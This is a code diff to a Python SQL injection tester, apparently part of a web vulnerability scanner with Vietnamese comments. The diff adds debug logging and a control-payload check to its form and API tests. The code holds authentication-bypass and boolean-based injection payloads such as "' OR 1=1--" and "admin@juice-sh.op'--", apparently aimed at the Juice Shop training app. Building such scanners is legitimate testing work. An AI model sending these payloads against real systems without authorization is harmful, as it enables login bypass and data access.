@@ -85,13 +85,25 @@ class SqliTester(BaseTester):
         return vulns
 
     def test_form(self, form_data: dict) -> List[Vulnerability]:
+        """Kiểm tra SQLi trên POST/PUT/GET Forms & APIs"""
         vulns = []
         url = form_data['url']
         method = form_data.get('method', 'POST').upper()
         inputs = form_data['inputs']
         is_api = form_data.get('is_api', False) or any(k in url.lower() for k in ['/api/', '/rest/', '/v1/', '/v2/'])
 
+        # [DEBUG LOG]
+        print(f"  [DEBUG-SQLI] Analyzing Endpoint: {method} {url} (Is API: {is_api})", flush=True)
+        print(f"  [DEBUG-SQLI] Form Inputs: {inputs}", flush=True)
+
         base_resp = self._inject_form_payload(url, method, inputs, None, None, is_api)
+        if not base_resp:
+            print(f"  [DEBUG-SQLI] Failed to get baseline response for {url}", flush=True)
+            return vulns
+
+        base_status = base_resp.status_code
+        base_len = len(base_resp.content)
+        print(f"  [DEBUG-SQLI] Baseline Response - Status: {base_status}, Length: {base_len} bytes", flush=True)
 
         for target_input in inputs:
             if target_input.get('type') in ['hidden', 'submit', 'radio', 'button']: continue
@@ -101,31 +113,57 @@ class SqliTester(BaseTester):
             if is_api and method == 'POST':
                 auth_bypass_payloads = ["' OR 1=1--", "admin@juice-sh.op'--", "' OR true--"]
                 for payload in auth_bypass_payloads:
+                    print(f"  [DEBUG-SQLI] Trying Auth Bypass on [{param}] with payload: {payload}", flush=True)
                     try:
                         resp = self._inject_form_payload(url, method, inputs, param, payload, is_api)
-                        if resp and resp.status_code in [200, 201]:
-                            if any(k in resp.text.lower() for k in
-                                   ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
-                                vulns.append(Vulnerability(
-                                    type='SQL Injection', subcategory='Authentication Bypass (API)', url=url,
-                                    details={'parameter': f"JSON Body: {param}", 'payload': payload,
-                                             'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'},
-                                    severity='Critical'
-                                ))
-                                break
-                    except requests.RequestException:
-                        pass
+                        if resp:
+                            print(
+                                f"  [DEBUG-SQLI] Auth Response - Status: {resp.status_code}, Length: {len(resp.content)} bytes",
+                                flush=True)
 
+                            if resp.status_code in [200, 201]:
+                                print(f"  [DEBUG-SQLI] Response Body Snippet: {resp.text[:150]}", flush=True)
+
+                                if any(k in resp.text.lower() for k in
+                                       ['token', 'session', 'success', 'jwt', 'user', 'authentication']):
+                                    # Gửi payload sai để verify chắc chắn
+                                    bad_resp = self._inject_form_payload(url, method, inputs, param, "' AND 1=2--",
+                                                                         is_api)
+                                    bad_status = bad_resp.status_code if bad_resp else "N/A"
+                                    print(f"  [DEBUG-SQLI] Control Payload Response Status: {bad_status}", flush=True)
+
+                                    if bad_resp and bad_resp.status_code in [401, 403, 404, 500]:
+                                        print(f"  [DEBUG-SQLI] !!! SQLI AUTH BYPASS SUCCESS !!!", flush=True)
+                                        vulns.append(Vulnerability(
+                                            type='SQL Injection', subcategory='Authentication Bypass (API)', url=url,
+                                            details={'parameter': f"JSON Body: {param}", 'payload': payload,
+                                                     'evidence': 'Successful authentication bypass using SQL injection payload in JSON API.'},
+                                            severity='Critical'
+                                        ))
+                                        break
+                    except requests.RequestException as e:
+                        print(f"  [DEBUG-SQLI] Request error during Auth Bypass: {e}", flush=True)
+
+            # --- BOOLEAN-BASED VERIFICATION TRÊN POST/PUT FORM ---
             true_payload = "' AND 1=1--"
             false_payload = "' AND 1=2--"
+            print(f"  [DEBUG-SQLI] Testing Boolean-Based on [{param}]", flush=True)
             try:
                 resp_true = self._inject_form_payload(url, method, inputs, param, true_payload, is_api)
                 resp_false = self._inject_form_payload(url, method, inputs, param, false_payload, is_api)
-                if resp_true and resp_false and base_resp:
+                if resp_true and resp_false:
                     sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                     sim_false = self._calculate_similarity(base_resp.text, resp_false.text)
+                    print(
+                        f"  [DEBUG-SQLI] Boolean Results - True similarity: {sim_true:.3f}, False similarity: {sim_false:.3f}",
+                        flush=True)
+                    print(
+                        f"  [DEBUG-SQLI] Status Codes - True: {resp_true.status_code}, False: {resp_false.status_code}",
+                        flush=True)
+
                     if (sim_true > 0.95 and sim_false < 0.90) or (
                             resp_true.status_code == 200 and resp_false.status_code >= 400):
+                        print(f"  [DEBUG-SQLI] !!! SQLI BOOLEAN-BASED SUCCESS !!!", flush=True)
                         vulns.append(Vulnerability(
                             type='SQL Injection', subcategory=f'Boolean-Based ({method})', url=url,
                             details={'parameter': f"Body/Query: {param}", 'true_payload': true_payload,
@@ -134,8 +172,8 @@ class SqliTester(BaseTester):
                             severity='Critical'
                         ))
                         break
-            except requests.RequestException:
-                pass
+            except requests.RequestException as e:
+                print(f"  [DEBUG-SQLI] Request error during Boolean test: {e}", flush=True)
         return vulns
 
     def _inject_payload(self, parsed_url, params, target_param, payload):
